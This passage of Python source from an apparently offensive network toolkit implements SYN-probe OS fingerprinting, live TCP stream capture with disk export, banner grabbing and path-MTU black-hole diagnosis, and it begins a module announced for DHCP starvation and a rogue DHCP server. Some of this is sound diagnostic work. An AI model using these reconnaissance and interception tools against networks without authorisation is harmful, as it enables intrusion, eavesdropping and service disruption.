            ("order_hint", ("MSS", "NOP", "WScale", "NOP", "NOP", "Timestamp", "SAckOK")), ("weight", 7),
        ]),
        OrderedDict([
            ("family", "Cisco IOS / network appliance"),
            ("ttl", (255, 254)), ("windows", (4128, 8192, 4380, 16384)),
            ("requires", ()), ("forbids", ("Timestamp",)),
            ("order_hint", ("MSS",)), ("weight", 7),
        ]),
        OrderedDict([
            ("family", "Embedded device / printer / NAT middlebox"),
            ("ttl", (255, 64, 128)), ("windows", (512, 1024, 2048, 4096)),
            ("requires", ()), ("forbids", ()),
            ("order_hint", ()), ("weight", 6),
        ]),
        OrderedDict([
            ("family", "Solaris / AIX (legacy enterprise UNIX)"),
            ("ttl", (255, 252, 64)), ("windows", (8760, 16384, 32768, 65535)),
            ("requires", ("MSS",)), ("forbids", ("WScale", "Timestamp")),
            ("order_hint", ("MSS", "NOP", "WScale")), ("weight", 5),
        ]),
        OrderedDict([
            ("family", "Android / mobile Linux stack"),
            ("ttl", (64,)), ("windows", (65535, 28960, 32768)),
            ("requires", ("SAckOK",)), ("forbids", ()),
            ("order_hint", ("MSS", "SAckOK", "Timestamp", "NOP", "WScale")), ("weight", 6),
        ]),
    )

    @classmethod
    def probe_options(cls) -> List[Any]:
        """Standard p0f-style probe: MSS, SACK OK, Timestamp, NOP, Window Scale."""
        return [("MSS", 1460), ("SAckOK", b""), ("Timestamp", (0, 0)), ("NOP", None), ("WScale", 10)]

    @classmethod
    def extract_evidence(cls, reply: Any) -> Dict[str, Any]:
        evidence: Dict[str, Any] = OrderedDict([
            ("ttl", None), ("window", None), ("df", None), ("options", []),
            ("mss", None), ("wscale", None), ("sackok", False), ("timestamps", False),
            ("ack_flag_only", False), ("received", False),
        ])
        try:
            if reply is None:
                return evidence
            evidence["received"] = True
            if reply.haslayer(IP):
                evidence["ttl"] = int(reply[IP].ttl)
                evidence["df"] = bool(int(getattr(reply[IP], "flags", 0)) & 0x2)
            if reply.haslayer(TCP):
                evidence["window"] = int(reply[TCP].window)
                flag_string = str(reply[TCP].flags)
                evidence["ack_flag_only"] = ("A" in flag_string and "S" not in flag_string)
                for option in reply[TCP].options:
                    try:
                        kind, value = option[0], option[1]
                    except (IndexError, TypeError):
                        continue
                    evidence["options"].append(str(kind))
                    if kind == "MSS":
                        evidence["mss"] = value
                    elif kind == "WScale":
                        evidence["wscale"] = value
                    elif kind == "SAckOK":
                        evidence["sackok"] = True
                    elif kind == "Timestamp":
                        evidence["timestamps"] = True
        except (AttributeError, IndexError, KeyError, TypeError, ValueError):
            pass
        return evidence

    @classmethod
    def classify(cls, evidence: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Score every rule against the evidence and return ranked candidates."""
        if not evidence.get("received"):
            return []
        option_names = [str(name) for name in evidence.get("options", [])]
        candidates: List[Dict[str, Any]] = []
        for rule in cls.RULES:
            score = 0
            reasons: List[str] = []
            if evidence.get("ttl") in tuple(rule["ttl"]):
                score += 3
                reasons.append("ttl=%s match" % evidence.get("ttl"))
            if evidence.get("window") in tuple(rule["windows"]):
                score += 2
                reasons.append("window=%s match" % evidence.get("window"))
            for required in rule["requires"]:
                if required in option_names:
                    score += 1
                    reasons.append("%s present" % required)
            for forbidden in rule["forbids"]:
                if forbidden in option_names:
                    score -= 1
                    reasons.append("%s present (contradiction)" % forbidden)
            hint = tuple(rule["order_hint"])
            if hint:
                index = 0
                for name in option_names:
                    if index < len(hint) and name == hint[index]:
                        index += 1
                if hint and index >= max(1, len(hint) // 2):
                    score += 2
                    reasons.append("option order resembles %s" % ",".join(hint[:index]) or "partial")
            if evidence.get("sackok") and "SAckOK" in rule["requires"]:
                score += 1
            if evidence.get("timestamps") and "Timestamp" in rule["requires"]:
                score += 1
            if rule["family"].startswith("Embedded") and evidence.get("window") in (512, 1024, 2048, 4096):
                score += 2
                reasons.append("small classic window")
            maximum = rule["weight"] + 6.0
            confidence = max(0.0, min(96.0, (score / maximum) * 100.0))
            if score > 0:
                candidates.append(OrderedDict([
                    ("family", rule["family"]),
                    ("score", score),
                    ("confidence_percent", round(confidence, 1)),
                    ("evidence", reasons),
                ]))
        candidates.sort(key=lambda entry: entry["score"], reverse=True)
        return candidates[:4]


def tcp_os_fingerprint(target: str, port: int = 80, timeout: float = DEFAULT_TIMEOUT,
                       iface: Optional[str] = None) -> Dict[str, Any]:
    """Send a crafted SYN probe and classify the responding stack heuristically."""
    if not require_scapy("TCP OS fingerprint"):
        raise FrameworkError("scapy unavailable")
    note("stack fingerprint probe -> %s:%d" % (target, port))
    packet = (IP(dst=target, ttl=64, flags="DF")
              / TCP(sport=random_source_port(), dport=int(port), flags="S",
                    window=29200, options=OsFingerprinter.probe_options()))
    kwargs: Dict[str, Any] = {"timeout": max(0.2, timeout), "verbose": 0}
    if iface:
        kwargs["iface"] = iface
    try:
        reply = sr1(packet, **kwargs)
    except (OSError, PermissionError) as exc:
        raise FrameworkError("probe transmission failed: %s" % exc)
    if reply is None:
        warn("no SYN/ACK received - port may be closed, filtered, or the host unreachable.")
        return OrderedDict([("mode", "os-fingerprint"), ("target", target), ("port", port),
                            ("evidence", {}), ("candidates", []), ("received", False)])
    evidence = OsFingerprinter.extract_evidence(reply)
    candidates = OsFingerprinter.classify(evidence)
    heading("TCP/IP STACK FINGERPRINT")
    kv_table([
        ("Target", "%s:%d" % (target, port)),
        ("Reply", c(str(reply.summary()), "grey")),
        ("Initial TTL", evidence.get("ttl")),
        ("Receive window", evidence.get("window")),
        ("DF bit set", evidence.get("df")),
        ("MSS", evidence.get("mss")),
        ("Window scale", evidence.get("wscale")),
        ("SACK permitted", evidence.get("sackok")),
        ("Timestamps", evidence.get("timestamps")),
        ("Option order", ",".join(str(name) for name in evidence.get("options", [])) or "none"),
    ])
    if candidates:
        out("")
        out(c("  ranked stack candidates", "cyan"))
        for candidate in candidates:
            out("    %-52s score=%-3d confidence=%5.1f%%" % (
                candidate["family"][:52], candidate["score"], candidate["confidence_percent"]))
            out("        %s" % c("; ".join(candidate["evidence"])[:150], "grey"))
    else:
        warn("no rule matched the evidence - stack may be exotic, virtualised or a middlebox.")
    summary = OrderedDict([
        ("mode", "os-fingerprint"),
        ("target", target), ("port", port),
        ("evidence", evidence), ("candidates", candidates),
        ("received", True),
        ("reply_summary", str(reply.summary())),
    ])
    artifact = LOGGER.scan("os_fingerprint", summary, target="%s:%d" % (target, port))
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def follow_tcp_stream(host_a: str, port_a: int, host_b: str, port_b: int,
                      iface: Optional[str] = None, duration: float = 15.0,
                      source_pcap: str = "", hex_mode: bool = False,
                      output_dir: str = "") -> Dict[str, Any]:
    """
    Follow a TCP conversation: live capture (scapy sniff) or an offline PCAP.

    Reassembles both directions with StreamReassembler and prints each stream as
    ASCII (or hex), optionally writing the streams to disk for evidence.
    """
    if not require_scapy("TCP stream follower"):
        raise FrameworkError("scapy unavailable")
    reassembler = StreamReassembler()

    def _5tuple_match(packet: Any) -> bool:
        try:
            src, dst = str(packet[IP].src), str(packet[IP].dst)
            sport, dport = int(packet[TCP].sport), int(packet[TCP].dport)
        except (AttributeError, IndexError, TypeError, ValueError):
            return False
        direct = (src == host_a and dst == host_b and sport == int(port_a) and dport == int(port_b))
        reverse = (src == host_b and dst == host_a and sport == int(port_b) and dport == int(port_a))
        any_port = (src in (host_a, host_b) and dst in (host_a, host_b))
        if direct or reverse:
            return True
        if port_a == 0 or port_b == 0:
            return any_port
        return any_port and port_a in (sport, dport)
    if source_pcap:
        if not os.path.isfile(source_pcap):
            raise FrameworkError("capture file not found: %s" % source_pcap)
        note("reading %s for the requested conversation ..." % source_pcap)
        try:
            packets = rdpcap(source_pcap)
        except Exception as exc:
            raise FrameworkError("capture unreadable: %s" % exc)
        matched = 0
        for packet in packets:
            if _5tuple_match(packet):
                reassembler.add(packet)
                matched += 1
        note("matched %d packet(s) of %d in the capture" % (matched, len(packets)))
    else:
        heading("FOLLOW TCP STREAM - LIVE CAPTURE")
        kv_table([
            ("Endpoint A", "%s:%s" % (host_a, port_a or "any")),
            ("Endpoint B", "%s:%s" % (host_b, port_b or "any")),
            ("Interface", iface or "auto"),
            ("Duration", format_duration(duration)),
        ])
        note("capturing - generate traffic on this conversation now (Ctrl-C stops early)")
        bpf_parts = ["tcp", "host %s" % host_a, "host %s" % host_b]
        bpf = " and ".join(bpf_parts)
        kwargs: Dict[str, Any] = {"prn": reassembler.add, "store": False, "timeout": max(1.0, duration),
                                  "filter": bpf}
        if iface:
            kwargs["iface"] = iface
        try:
            sniff(**kwargs)
        except KeyboardInterrupt:
            warn("capture stopped early by operator.")
        except OSError as exc:
            raise FrameworkError("capture failed: %s (check the interface and BPF expression)" % exc)
    streams = reassembler.extract(hex_mode=False)
    heading("REASSEMBLED STREAMS")
    flow_summary = reassembler.summary()
    kv_table([
        ("Flows observed", flow_summary["flows"]),
        ("Streams extracted", len(streams)),
    ])
    written: List[str] = []
    if not streams:
        warn("no TCP payload observed for that conversation (SYN-only or wrong filter?).")
    for label, blob in streams.items():
        render_stream(blob, hex_mode=hex_mode, label=label)
        if output_dir and blob:
            try:
                os.makedirs(output_dir, exist_ok=True)
                safe = re.sub(r"[^A-Za-z0-9_.-]", "_", label)[:80]
                path = os.path.join(output_dir, "%s_%s.stream" % (LOGGER.session_id, safe))
                with open(path, "wb") as handle:
                    handle.write(blob)
                written.append(path)
                note("stream written: %s (%s)" % (path, format_bytes(len(blob))))
            except OSError as exc:
                warn("could not write stream: %s" % exc)
    summary = OrderedDict([
        ("mode", "follow-tcp-stream"),
        ("endpoints", {"a": "%s:%s" % (host_a, port_a or "any"),
                       "b": "%s:%s" % (host_b, port_b or "any")}),
        ("source", source_pcap or "live-capture"),
        ("flows", flow_summary["detail"]),
        ("streams_bytes", {label: len(blob) for label, blob in streams.items()}),
        ("files_written", written),
        ("preview", {label: blob[:2048].decode("utf-8", "replace")
                     for label, blob in list(streams.items())[:4]}),
    ])
    artifact = LOGGER.scan("tcp_stream", summary, target="%s/%s" % (host_a, host_b))
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def route_lookup(target: str, iface_hint: Optional[str] = None) -> Dict[str, Any]:
    """
    Show which interface, source address and next hop would carry traffic to a
    target - the same decision the kernel makes before any packet leaves.
    """
    resolved = resolve_target(target)
    if not resolved:
        raise FrameworkError("unable to resolve '%s'" % target)
    result: Dict[str, Any] = OrderedDict([
        ("target", resolved), ("interface", "unknown"), ("source", "unknown"),
        ("gateway", "unknown"), ("kernel_view", ""), ("scope", "unknown"),
    ])
    if SCAPY_AVAILABLE:
        try:
            iface_name, out_ip, gateway = scapy_conf.route.route(resolved)
            result["interface"] = str(iface_name)
            result["source"] = str(out_ip)
            result["gateway"] = str(gateway)
        except Exception as exc:
            LOGGER.event("warn", "scapy route lookup failed: %s" % exc, level="WARN")
    if shutil.which("ip"):
        proc = InterfaceManager._run(["ip", "route", "get", resolved])
        if proc.strip():
            result["kernel_view"] = proc.strip().splitlines()[0]
    if result["gateway"] in ("0.0.0.0", "", "unknown"):
        result["scope"] = "on-link (destination is inside a connected subnet)"
    else:
        result["scope"] = "routed via gateway"
    heading("ROUTING DECISION")
    kv_table(result.items())
    if result["kernel_view"]:
        out("  %s %s" % (c("kernel:", "cyan"), c(result["kernel_view"][:140], "grey")))
    summary = OrderedDict([("mode", "route-lookup"), ("result", result)])
    artifact = LOGGER.scan("route_lookup", summary, target=resolved)
    if artifact:
        note("artefact: %s" % artifact)
    return result


PMTU_PROBE_SIZES: Tuple[int, ...] = (1472, 1400, 1300, 1200, 1100, 1000, 900, 800, 700, 600, 508)


def _pmtu_probe(target: str, payload_size: int, df: bool, timeout: float,
                iface: Optional[str] = None) -> Dict[str, Any]:
    """
    Send one echo probe and classify the outcome.

    States: "reply" (the datagram traversed the path), "unreachable" (an ICMP
    error came back - which is the *healthy* signal for an oversize DF datagram),
    "silent" (nothing at all came back) and "error" (local failure).
    """
    payload = b"P" * max(0, int(payload_size))
    try:
        packet = IP(dst=target, flags="DF" if df else 0) / ICMP(
            type=8, id=random.randint(0, 0xFFFF), seq=payload_size & 0xFFFF) / Raw(payload)
    except Exception as exc:
        return OrderedDict([("state", "error"), ("detail", "packet build failed: %s" % exc),
                            ("icmp_signal", ""), ("reported_mtu", None)])
    kwargs: Dict[str, Any] = {"timeout": max(0.2, float(timeout)), "verbose": 0}
    if iface:
        kwargs["iface"] = iface
    started = time.time()
    try:
        reply = sr1(packet, **kwargs)
    except PermissionError:
        return OrderedDict([("state", "error"),
                            ("detail", "raw socket permission denied - run as root/administrator"),
                            ("icmp_signal", ""), ("reported_mtu", None)])
    except OSError as exc:
        return OrderedDict([("state", "error"), ("detail", "transmit failed: %s" % exc),
                            ("icmp_signal", ""), ("reported_mtu", None)])
    if reply is None:
        return OrderedDict([("state", "silent"), ("detail", "no response within %.1fs" % timeout),
                            ("icmp_signal", ""), ("reported_mtu", None)])
    rtt_ms = round((time.time() - started) * 1000.0, 2)
    try:
        if reply.haslayer(ICMP):
            icmp_type = int(reply[ICMP].type)
            icmp_code = int(reply[ICMP].code)
            if icmp_type == 0:
                return OrderedDict([("state", "reply"), ("detail", "echo reply %.2f ms" % rtt_ms),
                                    ("icmp_signal", ""), ("reported_mtu", None)])
            if icmp_type == 3 and icmp_code == 4:
                reported: Optional[int] = None
                try:
                    candidate = int(reply[ICMP].unused)
                    if 0 < candidate < 65536:
                        reported = candidate
                except (AttributeError, TypeError, ValueError):
                    reported = None
                return OrderedDict([
                    ("state", "unreachable"),
                    ("detail", "ICMP fragmentation-needed (next-hop MTU %s)"
                     % (reported if reported else "not advertised")),
                    ("icmp_signal", "ICMP type 3 code 4 (fragmentation needed)"),
                    ("reported_mtu", reported)])
            return OrderedDict([("state", "unreachable"),
                                ("detail", "ICMP type %d code %d" % (icmp_type, icmp_code)),
                                ("icmp_signal", "ICMP type %d code %d" % (icmp_type, icmp_code)),
                                ("reported_mtu", None)])
    except (AttributeError, IndexError, TypeError, ValueError):
        pass
    return OrderedDict([("state", "reply"), ("detail", "non-ICMP reply"),
                        ("icmp_signal", ""), ("reported_mtu", None)])


def classify_pmtu_probe(df_state: str, plain_state: str, df_size: int,
                        plain_size: int, icmp_signal: str = "") -> Dict[str, Any]:
    """
    Grade one DF/plain probe pair into a path verdict.

    A healthy path either carries the large datagram or answers with ICMP type 3
    code 4 so the sender learns the working size. A black hole accepts small
    datagrams and silently discards the large DF-marked ones, so the only
    symptom the sender ever sees is a timeout while small traffic keeps flowing.
    """
    verdict = "inconclusive"
    detail = "the probe pair produced no usable signature - re-run with a longer timeout"
    if df_state == "reply" and plain_state == "reply":
        verdict = "cleartext"
        detail = ("both the %d-byte DF probe and the %d-byte plain probe were delivered: "
                  "no MTU restriction at or below this size" % (df_size, plain_size))
    elif plain_state == "reply" and df_state in ("silent", "error"):
        if icmp_signal:
            verdict = "pmtud-signalled"
            detail = ("the %d-byte DF probe drew %s while the plain probe passed: PMTU "
                      "discovery is functioning, the effective MTU sits below %d bytes"
                      % (df_size, icmp_signal, df_size))
        else:
            verdict = "blackhole"
            detail = ("the %d-byte DF probe vanished with no ICMP error while the identical "
                      "payload without DF was delivered: DF-bit black hole (the classic "
                      "path-MTU black hole)" % df_size)
    elif df_state == "unreachable" or plain_state == "unreachable":
        verdict = "pmtud-signalled"
        detail = ("an ICMP error was returned for the %d-byte probe: the path reports the "
                  "size problem instead of dropping it silently" % df_size)
    elif df_state == "reply" and plain_state != "reply":
        verdict = "jitter"
        detail = ("the %d-byte DF probe was answered but the plain %d-byte probe was lost: "
                  "re-run to separate link loss from a filter" % (df_size, plain_size))
    elif df_state == "silent" and plain_state == "silent":
        if icmp_signal:
            verdict = "pmtud-signalled"
            detail = "both probes drew %s - the path advertises the size problem" % icmp_signal
        else:
            verdict = "blackhole"
            detail = ("both the DF and the plain probe for %d bytes were dropped without any "
                      "ICMP feedback: silent black hole at or below this size" % df_size)
    return OrderedDict([("verdict", verdict), ("detail", detail), ("df_state", df_state),
                        ("plain_state", plain_state), ("df_size", df_size),
                        ("plain_size", plain_size), ("icmp_signal", icmp_signal)])


def pmtu_blackhole_detect(target: str, iface: Optional[str] = None,
                          sizes: Optional[List[int]] = None, timeout: float = 2.0,
                          include_plain: bool = True) -> Dict[str, Any]:
    """
    Diagnose a path-MTU black hole.

    Descending DF probes find the largest payload that traverses the path; the
    first size that fails is then re-probed with the DF bit cleared. If the plain
    probe is delivered while the DF probe silently disappears, the path is
    dropping oversize datagrams without the ICMP feedback PMTU discovery depends
    on - the failure mode that makes large TLS transfers hang after a successful
    handshake.
    """
    if not require_scapy("PMTU black-hole detection"):
        raise FrameworkError("scapy unavailable")
    if not Privileges.raw_socket_available():
        raise FrameworkError("PMTU probing needs root/administrator authority (euid=%s)"
                             % Privileges.euid())
    probe_sizes: List[int] = []
    for candidate in (sizes or list(PMTU_PROBE_SIZES)):
        try:
            value = int(candidate)
        except (TypeError, ValueError):
            continue
        if 68 <= value <= 9000:
            probe_sizes.append(value)
    probe_sizes = sorted(set(probe_sizes), reverse=True)
    if not probe_sizes:
        raise FrameworkError("no usable probe sizes (each must be 68-9000 bytes)")
    note("PMTU black-hole detection -> %s (DF probes: %s)"
         % (target, ", ".join(str(size) for size in probe_sizes)))
    baseline = _pmtu_probe(target, 64, True, timeout, iface)
    out("  baseline 64-byte DF probe: %s (%s)" % (baseline["state"], baseline["detail"]))
    rows: List[Dict[str, Any]] = []
    boundary_size: Optional[int] = None
    failing: Optional[Dict[str, Any]] = None
    largest_ok: Optional[int] = None
    out("")
    out(c("  %-7s %-12s %s" % ("SIZE", "DF RESULT", "DETAIL"), "bold"))
    for size in probe_sizes:
        outcome = _pmtu_probe(target, size, True, timeout, iface)
        rows.append(OrderedDict([("size", size), ("df", outcome)]))
        out("  %-7d %-12s %s" % (size, outcome["state"], outcome["detail"]))
        if outcome["state"] == "reply":
            largest_ok = size
            break
        failing = outcome
    if largest_ok is not None:
        boundary_size = largest_ok + 28          # IPv4 header (20) + ICMP header (8)
    if failing is not None:
        pair_size = int(rows[-1]["size"])
        df_outcome = failing
    elif largest_ok is not None:
        pair_size = int(largest_ok)
        df_outcome = OrderedDict([
            ("state", "reply"),
            ("detail", "the largest tested DF payload (%d bytes) was delivered" % largest_ok),
            ("icmp_signal", ""), ("reported_mtu", None)])
    else:
        pair_size = int(probe_sizes[0])
        df_outcome = OrderedDict([
            ("state", "silent"),
            ("detail", "no DF probe was answered and none failed with an ICMP error"),
            ("icmp_signal", ""), ("reported_mtu", None)])
    if include_plain:
        plain_outcome = _pmtu_probe(target, pair_size, False, timeout, iface)
    else:
        plain_outcome = OrderedDict([("state", "unknown"),
                                     ("detail", "plain probe disabled by the operator"),
                                     ("icmp_signal", ""), ("reported_mtu", None)])
    if largest_ok is not None and largest_ok >= int(probe_sizes[0]):
        # the first (largest) probe already came back: nothing at the tested sizes
        # is restricted, so there is no black hole to infer from a lower size
        verdict = OrderedDict([
            ("verdict", "cleartext"),
            ("detail", "the largest tested DF payload (%d bytes) was delivered: no MTU "
                       "restriction at or below this size" % largest_ok),
            ("df_state", "reply"),
            ("plain_state", str(plain_outcome.get("state", "unknown"))),
            ("df_size", int(largest_ok)), ("plain_size", int(largest_ok)),
            ("icmp_signal", "")])
    else:
        verdict = classify_pmtu_probe(str(df_outcome.get("state", "silent")),
                                      str(plain_outcome.get("state", "silent")),
                                      int(pair_size), int(pair_size),
                                      str(df_outcome.get("icmp_signal", "")))
    heading("PMTU BLACK-HOLE VERDICT")
    kv_table([
        ("Target", target),
        ("Interface", iface or "auto"),
        ("Baseline reachability", "%s - %s" % (baseline["state"], baseline["detail"])),
        ("Probe pair size", "%d bytes" % pair_size),
        ("DF result / plain result", "%s / %s" % (df_outcome.get("state"),
                                                  plain_outcome.get("state"))),
        ("Largest DF payload delivered",
         ("%d bytes (path MTU ~%d bytes)" % (largest_ok, boundary_size)) if largest_ok
         else "none of the tested sizes"),
        ("ICMP feedback", df_outcome.get("icmp_signal")
         or plain_outcome.get("icmp_signal") or "none observed"),
        ("Verdict", verdict["verdict"]),
        ("Reading", verdict["detail"]),
    ])
    if verdict["verdict"] == "blackhole":
        warn("silent PMTU black hole: oversize DF datagrams are dropped without ICMP feedback.")
        note("mitigation: clamp MSS on the path (iptables/nft --clamp-mss-to-pmtu), lower the "
             "interface MTU, or let the application disable PMTU probing.")
    elif verdict["verdict"] == "pmtud-signalled":
        ok("the path reports oversize datagrams with ICMP - PMTU discovery is working.")
    elif verdict["verdict"] == "cleartext":
        ok("the path delivered every tested size - no MTU restriction observed.")
    else:
        warn("verdict inconclusive: %s" % verdict["detail"])
    summary = OrderedDict([
        ("mode", "pmtu-blackhole"),
        ("target", target),
        ("interface", iface or "auto"),
        ("baseline", baseline),
        ("probe_sizes", probe_sizes),
        ("rows", rows),
        ("pair_size", pair_size),
        ("df_outcome", df_outcome),
        ("plain_outcome", plain_outcome),
        ("largest_df_payload", largest_ok),
        ("path_mtu_estimate", boundary_size),
        ("verdict", verdict),
    ])
    artifact = LOGGER.scan("pmtu_blackhole", summary, target=target)
    if artifact:
        note("artefact: %s" % artifact)
    LOGGER.event("scan", "pmtu black-hole detection complete: %s (%s)"
                 % (verdict["verdict"], target))
    return summary


def pmtu_blackhole_interactive() -> None:
    """Menu wrapper for 13 option 8 - diagnose a path-MTU black hole."""
    target_raw = prompt_text("target IPv4/hostname")
    if target_raw is PROMPT_ABORT:
        return
    target = resolve_target(str(target_raw))
    if not target:
        err("unresolvable target '%s'." % target_raw)
        return
    iface_raw = prompt_text("interface (blank = auto)", default="", allow_blank=True)
    if iface_raw is PROMPT_ABORT:
        return
    timeout = prompt_float("per-probe timeout seconds", 0.2, 30.0, 2.0)
    if timeout is PROMPT_ABORT:
        return
    include_plain = prompt_yes_no("also probe the failing size without the DF bit?", True)
    try:
        pmtu_blackhole_detect(target, iface=str(iface_raw).strip() or None,
                              timeout=float(timeout), include_plain=bool(include_plain))
    except FrameworkError as exc:
        err(str(exc))


@module_guard("Network Utilities")
def module_network_utils(args: Optional[List[str]] = None) -> None:
    """Interactive toolbox: banners, MTU, stack fingerprinting, stream follow, routing."""
    actions = OrderedDict([
        ("1", "Service banner grabber (raw / prologue / TLS)"),
        ("2", "Path MTU discovery (DF probes with binary search)"),
        ("3", "TCP/IP stack fingerprint (heuristic OS detection)"),
        ("4", "Follow a TCP stream - live capture"),
        ("5", "Follow a TCP stream - from a PCAP file"),
        ("6", "Routing decision lookup for a target"),
        ("7", "ONLINE: service fingerprinting (TLS, HTTP, RDAP, DoH)"),
        ("8", "Path-MTU black-hole detector (DF vs plain probe pairing)"),
        ("0", "Return to main menu"),
    ])
    while True:
        heading("MODULE 13 - NETWORK UTILITIES")
        for key, label in actions.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("utils> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "8":
            pmtu_blackhole_interactive()
            continue

        if choice == "7":
            online_utils_console()
            continue
        if choice == "0":
            return
        if choice == "1":
            target_raw = prompt_text("target IPv4/hostname")
            if target_raw is PROMPT_ABORT:
                continue
            target = resolve_target(str(target_raw))
            if not target:
                err("unresolvable target '%s'." % target_raw)
                continue
            port_raw = prompt_text("port", default="22")
            if port_raw is PROMPT_ABORT:
                continue
            try:
                port = parse_port(port_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            prologue_raw = prompt_text("prologue to send (blank=none, 'http' = HEAD request, 'crlf' = newline)",
                                       default="", allow_blank=True)
            if prologue_raw is PROMPT_ABORT:
                continue
            prologue = b""
            token = str(prologue_raw).strip().lower()
            if token == "http":
                prologue = b"HEAD / HTTP/1.0\r\nHost: %s\r\nUser-Agent: PrismStrike\r\n\r\n" % target.encode()
            elif token == "crlf":
                prologue = b"\r\n"
            elif token:
                prologue = str(prologue_raw).encode("utf-8", "replace")
            use_tls = prompt_yes_no("wrap the connection in TLS?", port in (443, 8443, 993, 995, 465))
            banner_grab(target, port, prologue=prologue, use_tls=use_tls,
                        tls_sni=None if use_tls is False else target)
        elif choice == "2":
            target_raw = prompt_text("target IPv4/hostname")
            if target_raw is PROMPT_ABORT:
                continue
            target = resolve_target(str(target_raw))
            if not target:
                err("unresolvable target '%s'." % target_raw)
                continue
            ceiling = prompt_int("maximum probe size in bytes", 68, 9000, 1500)
            if ceiling is PROMPT_ABORT:
                continue
            mtu_path_discovery(target, max_size=int(ceiling))
        elif choice == "3":
            target_raw = prompt_text("target IPv4/hostname")
            if target_raw is PROMPT_ABORT:
                continue
            target = resolve_target(str(target_raw))
            if not target:
                err("unresolvable target '%s'." % target_raw)
                continue
            port_raw = prompt_text("port with a listening service (open TCP port)", default="80")
            if port_raw is PROMPT_ABORT:
                continue
            try:
                port = parse_port(port_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            tcp_os_fingerprint(target, port)
        elif choice in ("4", "5"):
            source_pcap = ""
            if choice == "5":
                pcaps: List[str] = []
                try:
                    for name in sorted(os.listdir(LOGGER.artifact_dir)):
                        if name.lower().endswith((".pcap", ".pcapng")):
                            pcaps.append(os.path.join(LOGGER.artifact_dir, name))
                except OSError:
                    pcaps = []
                if pcaps:
                    out(c("  available captures:", "cyan"))
                    for index, path in enumerate(pcaps[-8:], start=1):
                        out("    [%d] %s" % (index, os.path.basename(path)))
                    pick = prompt_int("pick a capture number, or 0 to type a path", 0, len(pcaps),
                                      len(pcaps))
                    if pick is PROMPT_ABORT:
                        continue
                    if int(pick) > 0:
                        source_pcap = pcaps[int(pick) - 1]
                if not source_pcap:
                    path_raw = prompt_text("capture file path")
                    if path_raw is PROMPT_ABORT:
                        continue
                    source_pcap = os.path.expanduser(str(path_raw))
            host_a = prompt_text("endpoint A IP (leave blank to use the pcap's own tuple)",
                                 default="", allow_blank=True)
            if host_a is PROMPT_ABORT:
                continue
            host_b = prompt_text("endpoint B IP", default="", allow_blank=True)
            if host_b is PROMPT_ABORT:
                continue
            port_a_raw = prompt_text("port A (0 = any)", default="0", allow_blank=True)
            if port_a_raw is PROMPT_ABORT:
                continue
            port_b_raw = prompt_text("port B (0 = any)", default="0", allow_blank=True)
            if port_b_raw is PROMPT_ABORT:
                continue
            try:
                port_a = parse_port(port_a_raw or 0)
                port_b = parse_port(port_b_raw or 0)
            except FrameworkError as exc:
                err(str(exc))
                continue
            resolution_a = resolve_target(host_a) if str(host_a).strip() else "0.0.0.0"
            resolution_b = resolve_target(host_b) if str(host_b).strip() else "255.255.255.255"
            duration = prompt_float("capture duration seconds (live mode)", 1.0, 600.0, 15.0)
            if duration is PROMPT_ABORT:
                continue
            hex_mode = prompt_yes_no("render streams as hex dumps instead of ASCII?", False)
            save_streams = prompt_yes_no("write reassembled streams to disk?", True)
            follow_tcp_stream(resolution_a or "0.0.0.0", port_a, resolution_b or "255.255.255.255",
                              port_b, duration=float(duration), source_pcap=source_pcap,
                              hex_mode=hex_mode,
                              output_dir=LOGGER.artifact_dir if save_streams else "")
        elif choice == "6":
            target_raw = prompt_text("target IPv4/hostname")
            if target_raw is PROMPT_ABORT:
                continue
            route_lookup(str(target_raw))
        else:
            warn("unrecognised selection '%s'." % choice)


# ===========================================================================
# MODULE 14 - DHCP OPERATIONS (server discovery, starvation stress test,
#             rogue server with lease management)
# ===========================================================================
DHCP_AVAILABLE = False
DHCP_IMPORT_ERROR = ""
try:
    from scapy.all import BOOTP, DHCP  # type: ignore[import-not-found]
    DHCP_AVAILABLE = True
except Exception as _dhcp_exc:  # pragma: no cover - environment dependent
    DHCP_IMPORT_ERROR = "%s: %s" % (type(_dhcp_exc).__name__, _dhcp_exc)

DHCP_MESSAGE_TYPES = {
    1: "DISCOVER", 2: "OFFER", 3: "REQUEST", 4: "DECLINE",
    5: "ACK", 6: "NAK", 7: "RELEASE", 8: "INFORM",
}
DHCP_FIELD_NAMES = {
    "message-type": "message_type", "server_id": "server_id", "lease_time": "lease_time",
    "subnet_mask": "subnet_mask", "router": "router", "name_server": "dns",
    "domain": "domain", "broadcast_address": "broadcast", "requested_addr": "requested_addr",
    "hostname": "hostname", "vendor_class_id": "vendor", "client_id": "client_id",
    "renewal_time": "renewal_time", "rebinding_time": "rebinding_time", "end": "end",
}


def mac_to_chaddr(mac: str) -> bytes:
    """Convert a textual MAC into the 16-byte BOOTP chaddr field."""
    cleaned = re.sub(r"[^0-9a-fA-F]", "", str(mac))
    if len(cleaned) != 12:
        raise FrameworkError("'%s' is not a 6-octet MAC address" % mac)
    try:
        return bytes.fromhex(cleaned) + b"\x00" * 10
    except ValueError:
        raise FrameworkError("'%s' contains non-hexadecimal characters" % mac)


def random_client_mac(prefix: str = "02") -> str:
    """Deterministic-prefix random MAC used by the starvation harness."""
    octets = [int(prefix, 16) & 0xFE | 0x02] + [random.randint(0, 255) for _ in range(5)]
    return ":".join("%02x" % octet for octet in octets)


def dhcp_options_to_dict(options: Any) -> Dict[str, Any]:
    """Flatten a scapy DHCP option list into a plain dictionary."""
    mapping: Dict[str, Any] = {}
    try:
        for item in options or []:
            if isinstance(item, tuple) and len(item) == 2:
                key, value = item
                name = DHCP_FIELD_NAMES.get(str(key), str(key))
                if name == "message_type":
                    try:
                        mapping[name] = DHCP_MESSAGE_TYPES.get(int(value), int(value))
                    except (TypeError, ValueError):
                        mapping[name] = str(value)
                else:
                    mapping[name] = value if not isinstance(value, bytes) else value.hex()
            elif isinstance(item, str):
                mapping[DHCP_FIELD_NAMES.get(item, item)] = True
    except (TypeError, ValueError, AttributeError):
        pass
    return mapping


class DHCPEngine:
    """Native DHCP framing: discovery, starvation and authorised rogue serving."""

    @staticmethod
    def build_discover(client_mac: str, xid: Optional[int] = None, hostname: str = "",
